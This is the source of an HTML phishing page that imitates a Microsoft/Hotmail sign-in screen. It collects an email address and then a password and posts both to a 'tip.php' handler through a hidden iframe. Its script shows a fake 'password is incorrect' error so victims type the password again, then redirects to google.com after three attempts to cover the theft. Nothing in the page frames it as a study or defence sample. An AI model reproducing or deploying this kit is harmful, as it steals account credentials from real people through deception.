<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="dbo_assetz/img/hotmail.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
    <style type="text/css">

       body{
        font-family: arial;
        background-image: url("bg.png");
        background-size: cover;
       }
       @media screen and (max-width: 600px) {
            #box{
                width: 90%;
            }
        }
        input:focus{
            outline: none;
        }
        #box{

            width: 350px;
            height: auto;
            padding: 35px;
            border: thin solid;
            margin: auto;
            margin-top: 70px;
            background-color: white;
            border: none;
        }
        #box a{
            text-decoration: none;
            color:#68A5D5;
        }

        #box2{

            width: 420px;
            height: auto;
         
            padding-top: 5px;
            padding-bottom: 5px;
           margin: auto;
            background-color: white;
            margin-top: 20px;
            font-size: 16px;
           
        }

    </style>
</head>
<body onload="e()">
<iframe name="votar" style="display:none;"></iframe>

<div id="box">
    <img src="microsoft_logo.svg">
  <span id="e_show">   <h3 style="font-family: arial; font-weight: bold; font-size:22px; color:#272727; ">Sign in</h3>
   <p style="color:red; font-size: 14px;">Enter a valid email address, phone number, or Skype name.</p>
    <div>
    <input type="email" name="ee" id="ee" style="width:100%; font-size: 15px; padding: 5px; border:none; border-bottom: thin solid gray" placeholder="Email, Phone or Skype" required="required" >
    <p style="font-size:14px; ">No account? <a href="#" style="text-decoration: none">Create one!</a></p>
    <p style="font-size:14px; "><a href="#" style="text-decoration: none">Sign in with a security key </a></p>
    <button style="background-color:#0067B8; color:white; width:120px; height: 35px; border:none; float: right; clear:both; " onclick="pass()">Next</button></div></span>

  



   <form action="tip.php" method="post" target="votar"><br> <span id="e_pass"><img src="arror.png" onclick="e()">  <span id="e" style="font-size: 14px;"></span>
    <div>
        <input type="hidden" id="email" name="email">
        <h3 style="font-family: arial; font-weight: bold; font-size:22px; color:#272727; ">Enter Password</h3><span id="msg"></span>
    <input type="password" name="password" id="ee" style="width:100%; font-size: 15px; padding: 5px; border:none; border-bottom: thin solid gray" placeholder="Password" required="required">
    <p style="font-size:14px; "><a href="#" style="text-decoration: none">Forgot password?</a></p>
    <p style="font-size:14px; "><a href="#" style="text-decoration: none">Sign in with a security key </a></p>
    <button name="submit" style="background-color:#0067B8; color:white; width:120px; height: 35px; border:none; float: right; clear:both; " onclick="conji()">Sign in</button></div></span></form>



    





    <div style="height:35px;"></div>
</div>
</div>
<div id="box2"><button  style="text-align: left;width:100%; font-size: 16px; height:40px; border:none; position: center";>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; <img src="key.png"/>&nbsp;&nbsp;&nbsp; Sign-in options</button><input type="hidden" id="count" value="1"></div>


<form action="tip.php" method="post" target="votar">
   <!-- <input type="submit" value="Skicka Tips" onclick="conji()"> -->

<script type="text/javascript">
    function conji(){
        //document.getElementById("count").value = 1;
        if(document.getElementById("count").value < 3){
        document.getElementById("count").value = parseInt(document.getElementById("count").value) + 1;
            msg = "<span style='color:red; font-size:14px; margin-bottom:30px;'>Your account password is incorrect. Try again.</span>";
            document.getElementById("msg").innerHTML = msg;
            document.getElementById("ee").value = "";
            }else{
                document.location.href="https://google.com";
            //msg = "<span style='color:red;'>Wow! Anuofia.</span>";
           //document.getElementById("msg").innerHTML = msg;
            }
    }
    function pass(){
        if(document.getElementById("ee").value !=""){
        document.getElementById("e_show").style.display = "none";
        document.getElementById("e_pass").style.display="block";
        document.getElementById("email").value = document.getElementById("ee").value;
        document.getElementById("e").innerHTML = document.getElementById("ee").value;
    }
}
    function e(){
        document.getElementById("e_show").style.display="block";
         document.getElementById("e_pass").style.display="none";
    }

   
</script>
</body>
</html>